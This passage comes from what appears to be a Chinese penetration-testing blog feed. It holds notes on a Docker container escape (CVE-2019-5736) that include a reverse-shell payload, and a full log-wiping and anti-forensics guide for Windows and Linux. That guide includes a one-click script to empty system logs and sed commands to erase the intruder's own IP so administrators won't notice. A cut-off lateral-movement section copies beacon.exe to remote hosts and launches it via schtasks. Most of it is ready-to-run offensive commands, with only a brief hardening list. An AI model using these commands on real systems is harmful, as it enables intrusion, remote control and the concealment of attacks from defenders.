bash">sudo apt-get remove docker docker-engine docker.io containerd runc<br>sudo apt-get update<br>sudo apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common<br>curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -<br>sudo add-apt-repository <span class="hljs-string">&quot;deb [arch=arm64] https://download.docker.com/linux/ubuntu <span class="hljs-subst">$(lsb_release -cs)</span> stable&quot;</span><br>sudo apt-cache madison docker-ce<br><br><span class="hljs-comment"># 下面选择一个docker-ce版本进行安装</span><br>sudo apt-get install docker-ce=&lt;version&gt;<br></code></pre></td></tr></table></figure><p>下面利用<a href="https://github.com/Frichetten/CVE-2019-5736-PoC/%E6%9D%A5%E5%A4%8D%E7%8E%B0">https://github.com/Frichetten/CVE-2019-5736-PoC/来复现</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 1 编译好main.go，此步骤略</span><br><br><span class="hljs-comment"># 2 备份runc或者docker-runc!!!</span><br>cp <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/docker-runc /u</span>sr<span class="hljs-regexp">/bin/</span>docker-runc.bak<br><br><span class="hljs-comment"># 3 启动一个docker容器</span><br>docker run -it --rm --name test ubuntu:<span class="hljs-number">18.04</span> <span class="hljs-regexp">/bin/</span>bash<br><br><span class="hljs-comment"># 4 将第一步编译的文件拷贝进容器，并且执行</span><br><br><span class="hljs-comment"># 5. 从主机上docker exec进这个容器，执行/bin/sh</span><br>执行完之后，poc会将<span class="hljs-regexp">/etc/</span>shadow文件复制到<span class="hljs-regexp">/tmp/</span>shadow<br><br>备注：如果需要反弹shell，只需要修改main.go里面的payload为：<br>payload = <span class="hljs-string">&quot;#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/xxxxx 0&gt;&amp;1&quot;</span><br></code></pre></td></tr></table></figure><h2 id="防止docker逃逸的方法"><a href="#防止docker逃逸的方法" class="headerlink" title="防止docker逃逸的方法"></a><strong>防止docker逃逸的方法</strong></h2><p>1、更新Docker版本到19.03.1及更高版本——CVE-2019-14271、覆盖CVE-2019-5736</p><p>2、runc版本 &gt; 1.0-rc6</p><p>3、k8s 集群版本&gt;1.12</p><p>4、Linux内核版本&gt;=2.6.22——CVE-2016-5195(脏牛)</p><p>5、Linux内核版本&gt;=4.14——CVE-2017–1000405(大脏牛)，未找到docker逃逸利用过程，但存在逃逸风险</p><p>6、不建议以root权限运行Docker服务</p><p>7、不建议以privileged（特权模式）启动Docker</p><p>8、不建议将宿主机目录挂载至容器目录</p><p>9、不建议将容器以—cap-add=SYSADMIN启动，SYSADMIN意为container进程允许执行mount、umount等一系列系统管理操作，<strong>存在容器逃逸风险</strong></p><p>参考：</p><p><a href="http://wjlshare.com/archives/1737">http://wjlshare.com/archives/1737</a></p><p><a href="https://www.kingkk.com/2021/01/%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/">https://www.kingkk.com/2021/01/%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/</a></p><p><a href="https://zhuanlan.zhihu.com/p/442762675">https://zhuanlan.zhihu.com/p/442762675</a></p><p><a href="https://blog.csdn.net/qq_41874930/article/details/109216506">https://blog.csdn.net/qq_41874930/article/details/109216506</a></p>]]></content>
    
    
    <categories>
      
      <category>云原生安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>痕迹清理</title>
    <link href="/2022/04/04/%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86/"/>
    <url>/2022/04/04/%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="痕迹清理"><a href="#痕迹清理" class="headerlink" title="痕迹清理"></a>痕迹清理</h1><h2 id="win"><a href="#win" class="headerlink" title="win"></a>win</h2><h3 id="日志删除"><a href="#日志删除" class="headerlink" title="日志删除"></a>日志删除</h3><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">应用程序日志：<span class="hljs-variable">%systemroot%</span><span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>onfig<span class="hljs-symbol">\A</span>ppEvent.EVT<br>安全日志：<span class="hljs-variable">%systemroot%</span><span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>onfig<span class="hljs-symbol">\S</span>ecEvent.EVT<br>系统日志：<span class="hljs-variable">%systemroot%</span><span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>onfig<span class="hljs-symbol">\S</span>ysEvent.EVT<br>DNS日志：<span class="hljs-variable">%sys temroot%</span><span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>onfig，默认文件大小512KB<br>Internet信息服务FTP日志：<span class="hljs-variable">%systemroot%</span><span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\l</span>ogfiles<span class="hljs-symbol">\m</span>sftpsvc1<span class="hljs-symbol">\ </span>每天记录<br>Internet信息服务WWW日志：<span class="hljs-variable">%systemroot%</span><span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\l</span>ogfiles<span class="hljs-symbol">\w</span>3svc1<span class="hljs-symbol">\ </span>每天记录<br>Scheduler服务日志默认位置：<span class="hljs-variable">%sys temroot%</span><span class="hljs-symbol">\s</span>chedlgu.txt<br></code></pre></td></tr></table></figure><p>以上日志在注册表里的键：<br>应用程序日志，安全日志，系统日志，DNS服务器日志，它们这些LOG文件在注册表中的：<code>HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Eventlog</code> 有的管理员很可能将这些日志重定位。其中EVENTLOG下面有很多的子表，里面可查到以上日志的定位目录。Schedluler服务日志在注册表中<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SchedulingAgent</code></p><h4 id="暴力删除"><a href="#暴力删除" class="headerlink" title="暴力删除"></a>暴力删除</h4><ol><li><p>eventvwr   自带管理器删除</p></li><li><p>wevtutil.exe   <code>&gt;=win7|admin</code></p></li></ol><p>获取日志分类列表：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">wevtutil el<br></code></pre></td></tr></table></figure><p>获取单个日志类别的统计信息：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">wevtutil gli &quot;windows powershell&quot;<br></code></pre></td></tr></table></figure><p>查看指定日志的具体内容：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">wevtutil qe /f:text &quot;windows powershell&quot;<br></code></pre></td></tr></table></figure><p>删除单个日志类别的所有信息：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">wevtutil cl &quot;windows powershell&quot;<br></code></pre></td></tr></table></figure><p>所有</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cmd">wevtutil cl security<br>wevtutil cl Setup<br>wevtutil cl System<br>wevtutil cl Aplication<br>wevtutil cl Forwarded Events<br></code></pre></td></tr></table></figure><ol start="3"><li>powershell  <code>admin</code></li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Clear-Eventlog</span> <span class="hljs-literal">-LogName</span> Security<br><span class="hljs-built_in">Clear-Eventlog</span> <span class="hljs-literal">-LogName</span> System<br></code></pre></td></tr></table></figure><h4 id="破坏日志记录进程"><a href="#破坏日志记录进程" class="headerlink" title="破坏日志记录进程"></a>破坏日志记录进程</h4><p>Windows日志对应于eventlog服务，找到该服务对应的进程svchost.exe，进而筛选出svchost.exe进程中具体实现日志功能的线程，调用TerminateThread结束线程，破坏日志记录功能</p><p>特别的地方：</p><p>由于只结束了实现日志功能的线程，所以Windows Event Log服务没有被破坏，状态仍为正在运行</p><p><a href="https://github.com/hlldz/Phant0m">Phant0m</a></p><p>定位eventlog服务对应进程svchost.exe的pid遍历该进程中的所有线程判断线程是否满足条件 Windows Event Log 服务需要调用wevtsvc.dll，完整路径为<code>%WinDir%\System32\wevtsvc.dll</code> 并且，如果线程调用了wevtsvc.dll，就可以判读该线程实现了日志记录功能结束线程 使用TerminateThread恢复方法 结束进程svchost.exe 重新开启Windows Event Log 服务：<code>net start eventlog</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">set-ExecutionPolicy</span> RemoteSigned   Y  <br>或者：<br>powershell <span class="hljs-literal">-ep</span> bypass<br><br>//<span class="hljs-built_in">kill</span> event log<br><span class="hljs-built_in">Invoke-Phant0m</span><br></code></pre></td></tr></table></figure><p>mimikatz</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">privilege::<span class="hljs-title">debug</span></span><br><span class="hljs-function"><span class="hljs-title">event</span>::</span><br></code></pre></td></tr></table></figure><p>msf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">clearev<br>run clearlogs(仅包含应用、系统、安全三个类型)<br><br>run event_manager  -i<br>run event_manager  -c(六种类型均会删除)<br></code></pre></td></tr></table></figure><p><a href="https://github.com/3gstudent/Windows-EventLog-Bypass">Windows-EventLog-Bypass</a> </p><p><strong>IIS日志</strong></p><p>IIS默认日志路径：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript"><span class="hljs-variable">%SystemDrive%</span><span class="hljs-symbol">\i</span>netpub<span class="hljs-symbol">\l</span>ogs<span class="hljs-symbol">\L</span>ogFiles<span class="hljs-symbol">\W</span>3SVC1\<br></code></pre></td></tr></table></figure><p>清除WWW日志：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmd">停止服务：<span class="hljs-built_in">net</span> stop w3svc<br>删除日志目录下所有文件：<span class="hljs-built_in">del</span> *.*<br>启用服务：<span class="hljs-built_in">net</span> <span class="hljs-built_in">start</span> w3svc<br></code></pre></td></tr></table></figure><h4 id="3389登陆记录清除"><a href="#3389登陆记录清除" class="headerlink" title="3389登陆记录清除"></a>3389登陆记录清除</h4><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bat">@<span class="hljs-built_in">echo</span> off<br>@reg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot; /va /f<br>@<span class="hljs-built_in">del</span> &quot;<span class="hljs-variable">%USERPROFILE%</span>\My Documents\Default.rdp&quot; /a<br>@<span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><h4 id="清除recent"><a href="#清除recent" class="headerlink" title="清除recent"></a>清除recent</h4><p>在文件资源管理器中点击“查看”-;“选项”-;在常规-;隐私中点击”清除”按钮</p><p>或直接打开C:\Users\Administrator\Recent并删除所有内容</p><p>或在命令行中输入<code>del /f /s /q “%userprofile%\Recent*.*</code></p><h3 id="日志伪造"><a href="#日志伪造" class="headerlink" title="日志伪造"></a>日志伪造</h3><p>使用eventcreate这个命令行工具来伪造日志或者使用自定义的大量垃圾信息覆盖现有日志。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">eventcreate -l system -so administrator -t warning -d &quot;this is a test&quot; -id <span class="hljs-number">500</span><br></code></pre></td></tr></table></figure><h3 id="擦除"><a href="#擦除" class="headerlink" title="擦除"></a>擦除</h3><h4 id="Cipher-命令多次覆写"><a href="#Cipher-命令多次覆写" class="headerlink" title="Cipher 命令多次覆写"></a>Cipher 命令多次覆写</h4><p>在删除文件后，可以利用Cipher 命令通过 /W 参数可反复写入其他数据覆盖已删除文件的硬盘空间，彻底删除数据防止被恢复。</p><p>比如，删除<code>D:\tools</code>目录下的文件，然后执行这条命令：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">cipher /w:D:\tools<br></code></pre></td></tr></table></figure><p>这样一来，D 盘上未使用空间就会被覆盖三次：一次 0x00、一次 0xFF，一次随机数，所有被删除的文件就都不可能被恢复了。</p><h4 id="Format命令覆盖格式化"><a href="#Format命令覆盖格式化" class="headerlink" title="Format命令覆盖格式化"></a>Format命令覆盖格式化</h4><p>Format 命令加上 /P 参数后，就会把每个扇区先清零，再用随机数覆盖。而且可以覆盖多次。比如：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">format</span> D: /P:<span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><p>这条命令表示把 D 盘用随机数覆盖 8 次。</p><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="清除命令历史记录"><a href="#清除命令历史记录" class="headerlink" title="清除命令历史记录"></a>清除命令历史记录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">histroy -r          <span class="hljs-comment">#删除当前会话历史记录</span><br><span class="hljs-built_in">history</span> -c          <span class="hljs-comment">#删除内存中的所有命令历史</span><br>rm .bash_history    <span class="hljs-comment">#删除历史文件中的内容</span><br>HISTZISE=0          <span class="hljs-comment">#通过设置历史命令条数来清除所有历史记录</span><br>vim ~/.bash_history <span class="hljs-comment">#删除不想保存的命令</span><br></code></pre></td></tr></table></figure><p>利用vim特性删除历史命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#使用vim打开一个文件</span><br>vi test.txt<br><span class="hljs-comment"># 设置vim不记录命令，Vim会将命令历史记录，保存在viminfo文件中。</span><br>:<span class="hljs-built_in">set</span> <span class="hljs-built_in">history</span>=0<br><span class="hljs-comment"># 用vim的分屏功能打开命令记录文件.bash_history，编辑文件删除历史操作命令</span><br>vsp ~/.bash_history<br><span class="hljs-comment"># 清除保存.bash_history文件即可。</span><br></code></pre></td></tr></table></figure><h3 id="在隐蔽的位置执行命令"><a href="#在隐蔽的位置执行命令" class="headerlink" title="在隐蔽的位置执行命令"></a>在隐蔽的位置执行命令</h3><p>使用vim打开文件执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">:<span class="hljs-built_in">set</span> <span class="hljs-built_in">history</span>=0<br>:!<span class="hljs-built_in">command</span><br></code></pre></td></tr></table></figure><h3 id="日志删除-1"><a href="#日志删除-1" class="headerlink" title="日志删除"></a>日志删除</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stata">/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">run</span>/utmp 记录现在登入的用户，使用w,who,users等命令查看<br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/wtmp 记录用户所有的登入和登出，使用last命令查看<br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/lastlog 记录每一个用户最后登入时间，使用lastlog命令查看<br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/btmp 记录所有登录失败信息，使用lastb命令查看<br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/auth.<span class="hljs-keyword">log</span> 需要身份确认的操作<br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/secure 记录安全相关的日志信息<br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/maillog 记录邮件相关的日志信息<br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/message 记录系统启动后的信息和错误日志<br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/cron 记录定时任务相关的日志信息<br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/spooler 记录UUCP和<span class="hljs-keyword">news</span>设备相关的日志信息<br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/<span class="hljs-keyword">boot</span>.<span class="hljs-keyword">log</span> 记录守护进程启动和停止相关的日志消息<br></code></pre></td></tr></table></figure><h4 id="全部删除"><a href="#全部删除" class="headerlink" title="全部删除"></a>全部删除</h4><p>清除登录系统失败的记录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@centos]<span class="hljs-comment"># echo &gt; /var/log/btmp </span><br>[root@centos]<span class="hljs-comment"># lastb             //查询不到登录失败信息</span><br></code></pre></td></tr></table></figure><p>清除登录系统成功的记录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@centos]<span class="hljs-comment"># echo &gt; /var/log/wtmp  </span><br>[root@centos]<span class="hljs-comment"># last              //查询不到登录成功的信息</span><br></code></pre></td></tr></table></figure><p>清除相关日志信息：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cmd">清除用户最后一次登录时间：<span class="hljs-built_in">echo</span> &gt; /var/log/lastlog          #lastlog命令<br>清除当前登录用户的信息：<span class="hljs-built_in">echo</span> &gt;   /var/log/utmp             #使用w,who,users等命令<br>清除安全日志记录：cat /dev/null &gt;  /var/log/secure<br>清除系统日志记录：cat /dev/null &gt;  /var/log/message<br></code></pre></td></tr></table></figure><h4 id="删除-替换部分日志"><a href="#删除-替换部分日志" class="headerlink" title="删除/替换部分日志"></a>删除/替换部分日志</h4><p>日志文件全部被清空，太容易被管理员察觉了，如果只是删除或替换部分关键日志信息，那么就可以完美隐藏攻击痕迹。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 删除所有匹配到字符串的行,比如以当天日期或者自己的登录ip</span><br>sed  -i <span class="hljs-string">&#x27;/自己的ip/&#x27;</span>d  /var/<span class="hljs-built_in">log</span>/messages<br><br><span class="hljs-comment"># 全局替换登录IP地址：</span><br>sed -i <span class="hljs-string">&#x27;s/192.168.166.85/192.168.1.1/g&#x27;</span> secure<br><br><span class="hljs-comment"># 删除当天日志</span><br>sed  -i <span class="hljs-string">&#x27;/当天日期/&#x27;</span>d  filename<br></code></pre></td></tr></table></figure><p>一键清除的bash脚本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/usr/bin/bash</span><br><span class="hljs-built_in">echo</span> &gt; /var/<span class="hljs-built_in">log</span>/syslog<br><span class="hljs-built_in">echo</span> &gt; /var/<span class="hljs-built_in">log</span>/messages<br><span class="hljs-built_in">echo</span> &gt; /var/<span class="hljs-built_in">log</span>/httpd/access_log<br><span class="hljs-built_in">echo</span> &gt; /var/<span class="hljs-built_in">log</span>/httpd/error_log<br><span class="hljs-built_in">echo</span> &gt; /var/<span class="hljs-built_in">log</span>/xferlog<br><span class="hljs-built_in">echo</span> &gt; /var/<span class="hljs-built_in">log</span>/secure<br><span class="hljs-built_in">echo</span> &gt; /var/<span class="hljs-built_in">log</span>/auth.log<br><span class="hljs-built_in">echo</span> &gt; /var/<span class="hljs-built_in">log</span>/user.log<br><span class="hljs-built_in">echo</span> &gt; /var/<span class="hljs-built_in">log</span>/wtmp<br><span class="hljs-built_in">echo</span> &gt; /var/<span class="hljs-built_in">log</span>/lastlog<br><span class="hljs-built_in">echo</span> &gt; /var/<span class="hljs-built_in">log</span>/btmp<br><span class="hljs-built_in">echo</span> &gt; /var/run/utmp<br>rm ~/./bash_history<br><span class="hljs-built_in">history</span> -c<br></code></pre></td></tr></table></figure><h3 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h3><p>shred</p><p>实现安全的从硬盘上擦除数据，默认覆盖3次，通过 -n指定数据覆盖次数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">shred -f -u -z -v -n 8 1.txt <br></code></pre></td></tr></table></figure><p>dd</p><p>可用于安全地清除硬盘或者分区的内容。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dd <span class="hljs-keyword">if</span>=/dev/zero of=要删除的文件 bs=大小 count=写入的次数<br></code></pre></td></tr></table></figure><p>wipe</p><p>使用特殊的模式来重复地写文件，从磁性介质中安全擦除文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wipe filename<br></code></pre></td></tr></table></figure><p>Secure-Delete</p><p>Secure-Delete 是一组工具集合，提供srm、smem、sfill、sswap，4个安全删除文件的命令行工具。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">srm filename<br>sfill filename<br>sswap <span class="hljs-regexp">/dev/</span>sda1<br>smem<br></code></pre></td></tr></table></figure><h3 id="隐藏远程SSH登陆记录"><a href="#隐藏远程SSH登陆记录" class="headerlink" title="隐藏远程SSH登陆记录"></a>隐藏远程SSH登陆记录</h3><p>隐身登录系统，不会被w、who、last等指令检测到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -T root@192.168.0.1 /bin/bash -i<br></code></pre></td></tr></table></figure><p>不记录ssh公钥在本地.ssh目录中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>内网</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>横向移动</title>
    <link href="/2022/03/31/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
    <url>/2022/03/31/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><h2 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h2><p>IPC(Inter Process Connection)共享<code>命名管道</code>的资源，是为了实现进程间通信而开放的命名管道。<code>IPC</code>可以通过验证用户名和密码获取相应权限，通常在远程管理计算机和查看计算机的共享资源时使用</p><p>通过<code>ipc$</code>可以与目标机器建立连接。利用这个连接，不仅可以访问目标机器只能够的文件，进行上传、下载等操作，还可以在目标机器上运行其他命令，以获取目标机器的目录结构、用户列表等信息</p><p>建立一个<code>ipc$</code>并查看当前连接输入如下命令</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">net</span> use \\ip\ipc$ &quot;password&quot; /user:administrator<br><span class="hljs-built_in">net</span> use<br></code></pre></td></tr></table></figure><p><strong>利用条件：</strong>开启139(NetBIOS)、445端口，管理员开启了默认共享，一般默认开启，对应的逻辑盘也可以访问到</p><p><strong>报错：</strong></p><ul><li>错误号5:拒绝访问</li><li>错误号51:windows无法找到网络路径，即网络中存在问题</li><li>错误号53:找不到网络路径，包括IP地址错误、目标未开机、目标lanmanserver服务未启动、目标有防火墙（端口过滤）</li><li>错误号67:找不到网络名，包括lanmanworkstation服务未启动、ipc$已被删除</li><li>错误号1219:提供的凭据与已存在的凭据集冲突。例如，已经和目标建立了ipc$,需要在删除原连接后重新进行连接</li><li>错误号1326:未知的用户名或密码错误</li><li>错误号1792:试图登录，但是网络登录服务没有启动，包括目标NetLogin服务未启动（连接域控制器时会出现此情况）</li><li>错误号2242:此用户的密码已经过期。例如，目标机器设置了账号管理策略，强制用户定期修改密码</li></ul><p>IPC建立后</p><blockquote><p>dir \\ip\C$</p><p>tasklist /S ip /U administrator /P 123456</p><p>net time \\ip</p><p>copy beacon.exe \\ip\C$</p><p>at \\ip  19:00:00 C:\beacon.exe</p><p>at \\ip /delete</p><p>//Windows Vista、windows server2008及之后版本的操作系统已将at命令废弃了</p><p>schtasks /create /s ip /tn test /sc onstart c:\beacon.exe /ru system /f</p><p>schtasks /run /s ip /i /tn “test”</p><p>schtasks /delete /s ip  /tn “test” /f</p><p>net use \\ip  /del /y</p></blockquote><h2 id="Windows-hash"><a href="#Windows-hash" class="headerlink" title="Windows hash"></a>Windows hash</h2><p><a href="https://xz.aliyun.com/t/8117#toc-16">https://xz.aliyun.com/t/8117#toc-16</a></p><p>Windows认证协议有两种NTLM（NT LAN Manager）和Kerberos，前者主要应用于用于Windows NT 和 Windows 2000 Server（or  Later） 工作组环境，而后者则主要应用于Windows 2000 Server（or Later） 域（Domain）环境</p><h3 id="LM-Hash-amp-NTLM-Hash"><a href="#LM-Hash-amp-NTLM-Hash" class="headerlink" title="LM Hash&amp;NTLM Hash"></a>LM Hash&amp;NTLM Hash</h3><p>windows操作系统密码一般由两部分组成，一部分为<code>LM Hash</code>另一部分为<code>NTLM Hash</code>在Windows中，Hash的结构通常如下</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span>RID:LM-HASH:NT-HASH<br></code></pre></td></tr></table></figure><p><strong>LM Hash</strong>全名为<code>LAN Manager Hash</code>是微软为了提高windows操作系统的安全性能而采用的散列加密算法，其<strong>本质是DES加密，密码不足14字节将用0补全</strong>。LM Hash较容易破解，但微软仅仅是将LM Hash禁用了<code>从windows Vista和windows server 2008版本开始，Windows操作系统默认禁用LM Hash</code>。LM Hash明文密码限定在14位以内，也就是说，如果要停止使用LM Hash 将用户密码设置为14位以上即可。如果抓取的LM Hash通常为<strong>AAD3B435B51404EEAAD3B435B51404EE</strong>表示<strong>密码为空或<code>LM Hash</code>被禁用</strong></p><p><strong>NTLM Hash</strong>是微软为了提高安全性的同时兼容而设计的散列加密算法。NTLM Hash 是<strong>基于MD4加密算法</strong>进行加密的。个人版从Windows vista 服务器版从windows server2003以后，windows操作系统的认证方式均为NTLM Hash</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200807162946-26dfbf56-d888-1.png"></p><p><strong>Net-NTLM Hash</strong></p><p>存在两个版本</p><p><strong>Net-NTLMv1:window2003和window xp之前默认启用</strong></p><p>Net-ntlm hash v1的格式为username::hostname:LM response:NTLM response:challenge</p><p>由于v1版本的加密方式比较脆弱，很容易解密得到NTLM Hash,基本在可控时间内能解出。</p><p><strong>Net-NTLMv2:window2008 和 window Vist之后默认启用</strong></p><p>Net-ntlm hash v2的格式为username::domain:challenge:HMAC-MD5:blob</p><p>v2版本,加密方式比较强，但是可以进行明文爆破，利用难度比较大。</p><p>NTLM使用在Windows NT和Windows 2000 